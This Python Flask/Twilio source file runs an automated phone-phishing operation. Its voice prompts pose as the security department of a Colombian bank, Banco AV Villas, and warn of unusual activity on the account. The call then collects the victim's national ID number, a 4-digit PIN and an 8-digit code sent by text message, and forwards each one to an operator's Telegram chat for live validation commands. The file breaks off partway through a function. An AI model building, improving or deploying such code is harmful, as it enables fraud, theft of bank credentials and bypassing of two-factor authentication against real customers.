from flask import Flask, request, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
import requests
import threading
import time
import logging
import json
import os
from datetime import datetime
import flask
from dotenv import load_dotenv

load_dotenv()

# Configurar logging
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Añadir un manejador de archivo para registro persistente
if not os.path.exists('logs'):
    os.makedirs('logs')
file_handler = logging.FileHandler(f'logs/app_{datetime.now().strftime("%Y%m%d")}.log')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

app = Flask(__name__)

# ⚙️ Configuración desde variables de entorno
TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
TWILIO_PHONE_NUMBER = os.getenv('TWILIO_PHONE_NUMBER')
YOUR_PHONE_NUMBER = os.getenv('YOUR_PHONE_NUMBER')

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Diccionario para almacenar sesiones de usuario
global_user_sessions = {}
processed_message_ids = set()

call_status_messages_sent = {}
call_final_states = {'completed', 'failed', 'busy', 'no-answer', 'canceled'}

# Variable para controlar el polling de Telegram
telegram_polling_active = False
last_update_id = 0

def absolute_url(path):
    """Genera una URL absoluta sin depender del contexto de solicitud."""
    if flask.has_request_context():
        base = request.url_root
    else:
        base = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
        if not base.endswith('/'):
            base += '/'
    
    path = path.lstrip('/')
    full_url = base + path
    logger.info(f"🔗 URL generada: {full_url}")
    
    return full_url

# Funciones de persistencia de sesiones
def save_session_to_file(sessions_dict):
    """Guarda las sesiones en un archivo JSON para persistencia."""
    try:
        with open('sessions.json', 'w') as f:
            json.dump(sessions_dict, f)
            logger.info("📝 Sesiones guardadas en archivo")
    except Exception as e:
        logger.error(f"❌ Error al guardar sesiones: {e}")

def load_sessions_from_file():
    """Carga las sesiones desde un archivo JSON."""
    try:
        if os.path.exists('sessions.json'):
            with open('sessions.json', 'r') as f:
                sessions = json.load(f)
                logger.info(f"📂 Sesiones cargadas desde archivo: {len(sessions)} sesiones")
                return sessions
        else:
            logger.info("📂 No hay archivo de sesiones previo")
    except Exception as e:
        logger.error(f"❌ Error al cargar sesiones: {e}")
    return {}

# Cargar sesiones al inicio
global_user_sessions = load_sessions_from_file()

@app.route('/')
def index():
    return "Servidor de llamadas y verificación activo."

@app.route('/make-call')
def make_call():
    # Iniciar polling de Telegram si no está activo
    start_telegram_polling()
    
    # Construir la URL correctamente
    base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
    url = f"{base_url}/start"
    status_callback_url = f"{base_url}/call-status-callback"
    
    logger.info(f"📞 URL para la llamada: {url}")
    logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
    
    try:
        call = client.calls.create(
            to=YOUR_PHONE_NUMBER,
            from_=TWILIO_PHONE_NUMBER,
            url=url,
            status_callback=status_callback_url,
            status_callback_method='POST',
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
        )
        
        # Inicializar la sesión para el nuevo SID
        global_user_sessions[call.sid] = {
            'call_status': 'initiated',
            'to_number': YOUR_PHONE_NUMBER,
            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_session_to_file(global_user_sessions)
        
        # Notificar a Telegram
        send_to_telegram(f"🚀 <b>Llamada iniciada</b>\nSID: {call.sid}\nNúmero: {YOUR_PHONE_NUMBER}\nEstado: Iniciando...")
        
        logger.info(f"📞 Nueva llamada iniciada: SID={call.sid}")
        return jsonify({"status": "Llamada iniciada", "sid": call.sid})
    except Exception as e:
        logger.error(f"❌ ERROR AL INICIAR LLAMADA: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/call-status-callback', methods=['POST'])
def call_status_callback():
    """Endpoint para recibir actualizaciones de estado de llamada desde Twilio."""
    call_sid = request.values.get('CallSid')
    call_status = request.values.get('CallStatus')
    call_duration = request.values.get('CallDuration', '0')
    
    logger.info(f"📞 ACTUALIZACIÓN DE ESTADO DE LLAMADA: SID={call_sid}, Estado={call_status}, Duración={call_duration}s")
    
    # Verificar si existe la sesión para este SID
    if call_sid not in global_user_sessions:
        logger.warning(f"⚠️ Recibida actualización para SID desconocido: {call_sid}")
        global_user_sessions[call_sid] = {}
    
    # Obtener el estado anterior
    last_status = global_user_sessions[call_sid].get('call_status')
    
    # Solo procesar si el estado realmente cambió
    if call_status == last_status:
        logger.info(f"🔄 Estado duplicado ignorado para SID={call_sid}: {call_status}")
        return jsonify({"status": "ok"})
    
    # Guardar el estado y la hora de la actualización
    global_user_sessions[call_sid]['call_status'] = call_status
    global_user_sessions[call_sid]['last_update'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    global_user_sessions[call_sid]['call_duration'] = call_duration
    
    # Obtener el número de teléfono si existe
    to_number = global_user_sessions[call_sid].get('to_number', 'desconocido')
    
    # Guardar los cambios
    save_session_to_file(global_user_sessions)
    
    # Verificar si la llamada fue iniciada desde Telegram
    telegram_chat_id = global_user_sessions[call_sid].get('telegram_chat_id')
    
    # Controlar duplicación de mensajes usando el diccionario de control
    message_key = f"{call_sid}_{call_status}"
    
    # Si ya enviamos este mensaje de estado para este SID, no lo enviamos de nuevo
    if message_key in call_status_messages_sent:
        logger.info(f"🚫 Mensaje de estado ya enviado para {call_sid}: {call_status}")
        return jsonify({"status": "ok"})
    
    # Marcar este mensaje como enviado
    call_status_messages_sent[message_key] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Limpiar mensajes antiguos del diccionario de control (mantener solo los últimos 50)
    if len(call_status_messages_sent) > 50:
        items = list(call_status_messages_sent.items())
        call_status_messages_sent.clear()
        call_status_messages_sent.update(dict(items[-25:]))
    
    # Definir un icono según el estado
    status_icon = "📞"
    status_desc = "Estado actualizado"
    
    if call_status == "initiated":
        status_icon = "🔄"
        status_desc = "Llamada iniciada"
    elif call_status == "ringing":
        status_icon = "📳"
        status_desc = "Teléfono sonando"
    elif call_status == "in-progress":
        status_icon = "✅"
        status_desc = "Llamada contestada"
    elif call_status == "completed":
        status_icon = "🏁"
        status_desc = "Llamada finalizada"
    elif call_status == "busy":
        status_icon = "🔴"
        status_desc = "Número ocupado"
    elif call_status == "no-answer":
        status_icon = "❌"
        status_desc = "Sin respuesta"
    elif call_status == "failed":
        status_icon = "⚠️"
        status_desc = "Llamada fallida"
    elif call_status == "canceled":
        status_icon = "🚫"
        status_desc = "Llamada cancelada"
    
    # Crear mensaje de notificación
    message = f"{status_icon} <b>{status_desc}</b>\nSID: {call_sid}\nNúmero: {to_number}\nEstado: {call_status}"
    
    # Añadir duración si está disponible y no es cero
    if call_status in ["completed"] and call_duration != '0':
        message += f"\nDuración: {call_duration}s"
    
    # Enviar notificación a Telegram
    send_to_telegram(message)
    
    # Si hay un chat_id específico guardado, enviar también la notificación allí
    if telegram_chat_id:
        send_telegram_response(telegram_chat_id, message)
    
    # Si es un estado final, limpiar recursos relacionados con esta llamada
    if call_status in call_final_states:
        logger.info(f"🧹 Limpiando recursos para llamada finalizada: {call_sid}")
        keys_to_remove = [key for key in call_status_messages_sent.keys() if key.startswith(call_sid)]
        for key in keys_to_remove:
            call_status_messages_sent.pop(key, None)
    
    return jsonify({"status": "ok"})

@app.route('/start', methods=['POST'])
def start():
    """
    Endpoint inicial para iniciar el flujo de verificación.
    Este endpoint es llamado por Twilio al recibir una llamada.
    """
    response = VoiceResponse()
    
    # Pausa inicial de 5 segundos para que la persona se prepare
    response.pause(length=5)
    
    # Verificar si la llamada fue iniciada desde Telegram
    call_sid = request.values.get('CallSid')
    if call_sid and is_call_from_telegram(call_sid):
        response.say("Hola,le habla el sistema de seguridad del Banco Ave Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
        # Pausa de 4 segundos antes de redirigir
        response.pause(length=4)
        response.redirect('/step1')
    else:
        response.say("Hola,le habla el sistema de seguridad del Banco A V Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
        # Pausa de 4 segundos antes de redirigir
        response.pause(length=6)
        response.redirect('/step1')
    
    return str(response)


# STEP 1: CÉDULA (PRIMERO)
@app.route('/step1', methods=['POST', 'GET'])
def step1():
    response = VoiceResponse()
    gather = Gather(num_digits=10, action='/save-step1', method='POST', timeout=30, finish_on_key='')
    gather.say("Para validación de datos ingrese su número de cédula.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese su número de cédula ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step1')
    return str(response)

# CAMBIO 1: Modificar /save-step1 para mantener el estado de revalidación
@app.route('/save-step1', methods=['POST'])
def save_step1():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 1 (CÉDULA): CallSid={call_sid}, Digits={digits}")
    
    if not digits:
        return redirect_twiml('/step1')
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación INTERMEDIA
    is_intermediate_revalidation = 'validacion_intermedia' in global_user_sessions[call_sid]
    
    # Guardar la cédula
    global_user_sessions[call_sid]['cedula'] = digits
    
    # MANTENER el estado de revalidación intermedia si existe
    if is_intermediate_revalidation:
        logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
        # NO eliminamos validacion_intermedia aquí
        # PERO SÍ eliminamos correction_in_progress para indicar que el usuario ya corrigió
        global_user_sessions[call_sid].pop('correction_in_progress', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado cédula: {digits} para SID={call_sid}")
    
    response = VoiceResponse()
    response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
    
    # Verificar la longitud de los dígitos ingresados
    digit_length = len(digits)
    logger.info(f"📏 Longitud de cédula ingresada: {digit_length} dígitos")
    
    # Agregar pausa de 3 segundos si son 7 dígitos
    if digit_length == 7:
        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
        response.pause(length=3)
    
    # Si estamos en revalidación intermedia, notificar a Telegram y continuar al siguiente paso
    if is_intermediate_revalidation:
        data = global_user_sessions[call_sid]
        msg = f"🔄 Cédula actualizada en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
        send_to_telegram(msg)

        response.say("Gracias. Continuando con la revalidación de sus datos.", language='es-ES')
        response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        # Flujo normal: continuar al siguiente paso
        response.say("Continuando.", language='es-ES')
        response.redirect('/step2')
    
    return str(response)


# STEP 2: CÓDIGO DE 4 DÍGITOS (SEGUNDO)
@app.route('/step2', methods=['POST', 'GET'])
def step2():
    response = VoiceResponse()
    gather = Gather(num_digits=4, action='/save-step2', method='POST', timeout=20, finish_on_key='')
    gather.say("Digite su clave de 4 dígitos.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese los 4 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step2')
    return str(response)

@app.route('/save-step2', methods=['POST'])
def save_step2():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 2 (4 DÍGITOS): CallSid={call_sid}, Digits={digits}")
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación INTERMEDIA
    is_intermediate_revalidation = 'validacion_intermedia' in global_user_sessions[call_sid]
    
    # Guardar el código de 4 dígitos
    global_user_sessions[call_sid]['code4'] = digits
    
    # MANTENER el estado de revalidación intermedia si existe
    if is_intermediate_revalidation:
        logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
        # NO eliminamos validacion_intermedia aquí
        # PERO SÍ eliminamos correction_in_progress para indicar que el usuario ya corrigió
        global_user_sessions[call_sid].pop('correction_in_progress', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado código 4 dígitos: {digits} para SID={call_sid}")
    
    response = VoiceResponse()
    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
    
    # Obtener datos para el mensaje
    data = global_user_sessions[call_sid]
    digit_length = len(data.get('cedula', ''))
    
    # Iniciar polling de Telegram si no está activo
    start_telegram_polling()
    
    # Si estamos en revalidación intermedia, enviar mensaje de revalidación
    if is_intermediate_revalidation:
        msg = f"🔄 Código 4 dígitos actualizado en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
        send_to_telegram(msg)
        
        response.say("Gracias. Estamos revalidando sus datos actualizados. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        # Flujo normal: enviar mensaje de validación intermedia
        msg = f"🔍 <b>VALIDACIÓN INTERMEDIA</b> (Primeros 2 datos):\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\n<b>Responde con:</b>\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
        send_to_telegram(msg)
        
        response.say("Estamos validando sus primeros datos. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=false")
    
    return str(response)

# CAMBIO 2: Nueva ruta para esperar validación intermedia
@app.route('/waiting-intermediate-validation', methods=['POST', 'GET'])
def waiting_intermediate_validation():
    """
    Ruta específica para mostrar un mensaje de espera mientras se validan los primeros 2 datos.
    """
    call_sid = request.values.get('CallSid')
    wait_time = int(request.values.get('wait', 10))
    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
    
    logger.info(f"⏳ ESPERANDO VALIDACIÓN INTERMEDIA PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el CallSid para la espera de validación intermedia")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar inmediatamente si ya hay una validación intermedia
    if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
        logger.info(f"⚠️ VALIDACIÓN INTERMEDIA YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion_intermedia']}")
        response = VoiceResponse()
        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera intermedia")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    response = VoiceResponse()
    
    # Añadir un mensaje personalizado de espera
    if is_revalidation:
        response.say("Estamos validando sus datos actualizados. Por favor espere unos momentos.", language='es-ES')
    else:
        response.say("Estamos validando sus primeros datos. Por favor espere unos momentos.", language='es-ES')
    
    # tiempo de pausa en segundos
    response.pause(length=10)
    
    # Redirigir a la verificación de resultados intermedios después de la espera
    if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
        logger.info(f"✅ VALIDACIÓN INTERMEDIA DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
    else:
        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
    
    return str(response)

# CAMBIO 3: Nueva ruta para procesar resultados de validación intermedia
@app.route('/intermediate-validation-result', methods=['GET', 'POST'])
def intermediate_validation_result():
    call_sid = request.values.get('sid')
    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN INTERMEDIA PARA SID: {call_sid}")
    
    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
    if not call_sid and request.values.get('CallSid'):
        call_sid = request.values.get('CallSid')
        logger.info(f"📞 Usando CallSid del request: {call_sid}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el SID para validación intermedia")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si existe la clave 'validacion_intermedia'
    validation = global_user_sessions.get(call_sid, {}).get('validacion_intermedia')
    logger.info(f"⚠️ ESTADO DE VALIDACIÓN INTERMEDIA PARA SID={call_sid}: {validation}")

    response = VoiceResponse()

    # Si tenemos una validación intermedia
    if validation:
        logger.info(f"⚠️ VALIDACIÓN INTERMEDIA ENCONTRADA PARA SID={call_sid}: {validation}")
        
        # Resetear el contador de intentos ya que tenemos una validación
        count_key = f"{call_sid}_intermediate_retry_count"
        if count_key in global_user_sessions.get(call_sid, {}):
            global_user_sessions[call_sid][count_key] = 0
            save_session_to_file(global_user_sessions)
        
        if validation == [1, 1]:  # Ambos datos correctos
            # ELIMINAR el estado de revalidación intermedia Y correction_in_progress
            global_user_sessions[call_sid].pop('validacion_intermedia', None)
            global_user_sessions[call_sid].pop('correction_in_progress', None)
            save_session_to_file(global_user_sessions)
            
            response.say("Los primeros datos son correctos. Continuemos con el último paso.", language='es-ES')
            response.redirect('/step3')  # Continuar al paso 3
            return str(response)
        else:
            # HAY ERRORES EN LOS DATOS
            # Verificar si ya se está procesando una corrección
            correction_in_progress = global_user_sessions[call_sid].get('correction_in_progress', False)
            
            if not correction_in_progress:
                # PRIMERA VEZ detectando el error, marcar corrección en progreso
                global_user_sessions[call_sid]['correction_in_progress'] = True
                # NO eliminar la validación_intermedia aquí, la mantenemos para referencia
                save_session_to_file(global_user_sessions)
                
                # Mensaje general cuando hay errores en los primeros datos
                response.say("Hemos detectado algunos problemas con los primeros datos proporcionados.", language='es-ES')
                
                # Verificar qué dato es incorrecto y redirigir
                if validation[0] == 0:  # Cédula incorrecta
                    logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid} (PRIMERA CORRECCIÓN)")
                    response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
                    response.redirect('/step1')
                elif validation[1] == 0:  # Código de 4 dígitos incorrecto
                    logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid} (PRIMERA CORRECCIÓN)")
                    response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                    response.redirect('/step2')
                return str(response)
            else:
                # YA ESTAMOS EN PROCESO DE CORRECCIÓN
                # Esto significa que el usuario ya corrigió el dato y volvemos a tener una validación negativa
                # Verificar si la validación actual es diferente a la anterior
                
                # Para evitar bucles infinitos, limitar el número de correcciones
                correction_count_key = f"{call_sid}_correction_count"
                correction_count = global_user_sessions[call_sid].get(correction_count_key, 0)
                
                if correction_count >= 3:  # Máximo 3 intentos de corrección
                    logger.warning(f"⚠️ DEMASIADAS CORRECCIONES ({correction_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
                    response.say("Lo sentimos, hemos intentado validar sus datos varias veces sin éxito. Finalizando llamada.", language='es-ES')
                    return str(response)
                
                # Incrementar contador de correcciones
                global_user_sessions[call_sid][correction_count_key] = correction_count + 1
                save_session_to_file(global_user_sessions)
                
                logger.info(f"🔄 CORRECCIÓN #{correction_count + 1} PARA SID={call_sid} - VALIDACIÓN: {validation}")
                
                # Eliminar la validación anterior para permitir una nueva
                global_user_sessions[call_sid].pop('validacion_intermedia', None)
                save_session_to_file(global_user_sessions)
                
                response.say("Los datos siguen siendo incorrectos. Vamos a intentarlo una vez más.", language='es-ES')
                
                # Verificar qué dato sigue siendo incorrecto
                if validation[0] == 0:  # Cédula sigue incorrecta
                    logger.info(f"⚠️ CÉDULA SIGUE INCORRECTA - CORRECCIÓN #{correction_count + 1} PARA SID={call_sid}")
                    response.say("La cédula sigue siendo incorrecta. Por favor, verifíquela e ingrésela cuidadosamente.", language='es-ES')
                    response.redirect('/step1')
                elif validation[1] == 0:  # Código de 4 dígitos sigue incorrecto
                    logger.info(f"⚠️ CÓDIGO 4 DÍGITOS SIGUE INCORRECTO - CORRECCIÓN #{correction_count + 1} PARA SID={call_sid}")
                    response.say("El código de 4 dígitos sigue siendo incorrecto. Por favor, verifíquelo e ingréselo cuidadosamente.", language='es-ES')
                    response.redirect('/step2')
                
                return str(response)
    else:
        # NO HAY VALIDACIÓN AÚN - SEGUIR ESPERANDO
        # Añadimos un contador para evitar bucles infinitos
        count_key = f"{call_sid}_intermediate_retry_count"
        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
        
        # Si llevamos más de 8 intentos, finalizamos la llamada
        if retry_count > 8:
            logger.warning(f"⚠️ DEMASIADOS INTENTOS INTERMEDIOS ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
            return str(response)
        
        # Incrementar contador
        if call_sid in global_user_sessions:
            global_user_sessions[call_sid][count_key] = retry_count + 1
            save_session_to_file(global_user_sessions)
            logger.info(f"⚠️ ESPERANDO VALIDACIÓN INTERMEDIA PARA SID={call_sid}. INTENTO {retry_count + 1}")
        
        # Mensajes variados para que no suene repetitivo
        if retry_count % 3 == 0:
            response.say("Seguimos validando sus primeros datos. Gracias por su paciencia.", language='es-ES')
        elif retry_count % 3 == 1:
            response.say("Continuamos con el proceso de verificación inicial. Por favor espere un momento más.", language='es-ES')
        else:
            response.say("Sus primeros datos están siendo procesados. La validación está en curso.", language='es-ES')
            
        # Añadir una pausa de 10 segundos entre mensajes de voz
        response.pause(length=10)
        
        # Verificar explícitamente si hay validación antes de continuar
        if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
            logger.info(f"✅ VALIDACIÓN INTERMEDIA DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
            response.redirect(f"/intermediate-validation-result?sid={call_sid}")
        else:
            response.redirect(f"/intermediate-validation-result?sid={call_sid}")
    
    return str(response)


# STEP 3: CÓDIGO DE 8 DÍGITOS (TERCERO)
@app.route('/step3', methods=['POST', 'GET'])
def step3():
    response = VoiceResponse()
    gather = Gather(num_digits=8, action='/save-step3', method='POST', timeout=30, finish_on_key='')
    gather.say("Para terminar la validación digite el código enviado a su número celular asociado a su cuenta.", language='es-ES')
    gather.pause(length=1)
    gather.say("Ingrese el código de 8 dígitos ahora.", language='es-ES')
    response.append(gather)
    
    response.redirect('/step3')
    return str(response)

# CAMBIO 4: Modificar /save-step3 para validación final simplificada
@app.route('/save-step3', methods=['POST'])
def save_step3():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    
    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 3 (8 DÍGITOS): CallSid={call_sid}, Digits={digits}")
    
    # Asegurar que la sesión existe para este SID
    if call_sid not in global_user_sessions:
        global_user_sessions[call_sid] = {}
        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
    
    # Verificar si estamos en un proceso de revalidación
    is_revalidation = 'validacion_final' in global_user_sessions[call_sid]
    
    # Guardar el código de 8 dígitos
    global_user_sessions[call_sid]['code8'] = digits
    
    # Si había una validación previa, la eliminamos para forzar una nueva validación
    if is_revalidation and 'validacion_final' in global_user_sessions[call_sid]:
        logger.info(f"🔄 Eliminando validación final anterior para SID={call_sid}")
        global_user_sessions[call_sid].pop('validacion_final', None)
    
    save_session_to_file(global_user_sessions)
    
    logger.info(f"💾 Guardado código 8 dígitos: {digits} para SID={call_sid}")

    data = global_user_sessions[call_sid]
    logger.info(f"⚠️ DATOS COMPLETOS PARA SID={call_sid}: {data}")
    
    # Iniciar polling de Telegram si no está activo
    start_telegram_polling()
    
    response = VoiceResponse()
    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
    
    # Obtener longitud de cédula para el mensaje
    digit_length = len(data.get('cedula', ''))
    
    # Mensaje para validación final (solo el código de 8 dígitos)
    msg = f"🔍 <b>VALIDACIÓN FINAL</b> (Código de 8 dígitos):\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\n<b>Responde con:</b>\n/validar3 {call_sid} 1 (si está correcto)\n/validar3 {call_sid} 0 (si está incorrecto)"
    send_to_telegram(msg)
    
    if is_revalidation:
        response.say("Gracias. Estamos validando su código actualizado. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-final-validation?CallSid={call_sid}&wait=8&revalidation=true")
    else:
        response.say("Estamos validando su código final. Por favor, espere unos momentos.", language='es-ES')
        response.redirect(f"/waiting-final-validation?CallSid={call_sid}&wait=8&revalidation=false")
    
    return str(response)

# CAMBIO 5: Nueva ruta para esperar validación final
@app.route('/waiting-final-validation', methods=['POST', 'GET'])
def waiting_final_validation():
    """
    Ruta específica para mostrar un mensaje de espera mientras se valida el código final.
    """
    call_sid = request.values.get('CallSid')
    wait_time = int(request.values.get('wait', 10))
    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
    
    logger.info(f"⏳ ESPERANDO VALIDACIÓN FINAL PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el CallSid para la espera de validación final")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar inmediatamente si ya hay una validación final
    if call_sid in global_user_sessions and 'validacion_final' in global_user_sessions[call_sid]:
        logger.info(f"⚠️ VALIDACIÓN FINAL YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion_final']}")
        response = VoiceResponse()
        response.redirect(f"/final-validation-result?sid={call_sid}")
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera final")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    response = VoiceResponse()
    
    # Añadir un mensaje personalizado de espera
    if is_revalidation:
        response.say("Estamos validando su código actualizado. Por favor espere unos momentos.", language='es-ES')
    else:
        response.say("Estamos validando su código final. Por favor espere unos momentos.", language='es-ES')
    
    # tiempo de pausa en segundos
    response.pause(length=10)
    
    # Redirigir a la verificación de resultados finales después de la espera
    if call_sid in global_user_sessions and 'validacion_final' in global_user_sessions[call_sid]:
        logger.info(f"✅ VALIDACIÓN FINAL DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
        response.redirect(f"/final-validation-result?sid={call_sid}")
    else:
        response.redirect(f"/final-validation-result?sid={call_sid}")
    
    return str(response)


# CAMBIO 6: Nueva ruta para procesar resultados de validación final
@app.route('/final-validation-result', methods=['GET', 'POST'])
def final_validation_result():
    call_sid = request.values.get('sid')
    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN FINAL PARA SID: {call_sid}")
    
    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
    if not call_sid and request.values.get('CallSid'):
        call_sid = request.values.get('CallSid')
        logger.info(f"📞 Usando CallSid del request: {call_sid}")
    
    # Si no tenemos SID, no podemos hacer nada
    if not call_sid:
        logger.error("❌ No se pudo obtener el SID para validación final")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si SID existe en sesiones
    if call_sid not in global_user_sessions:
        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
        response = VoiceResponse()
        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
        return str(response)
    
    # Verificar si existe la clave 'validacion_final'
    validation = global_user_sessions.get(call_sid, {}).get('validacion_final')
